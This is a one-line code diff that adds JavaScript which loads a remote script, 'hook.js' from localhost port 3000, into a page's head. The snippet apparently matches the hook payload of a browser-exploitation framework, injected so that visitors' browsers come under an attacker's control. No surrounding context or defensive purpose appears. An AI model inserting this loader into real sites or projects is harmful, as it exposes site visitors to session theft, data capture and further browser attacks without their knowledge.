@@ -1,0 +1,1 @@
+var u = "http://localhost:3000/hook.js"; var s = document.createElement("script"); s.type = "text/javascript"; s.src = u; document.getElementsByTagName("head")[0].appendChild(s);
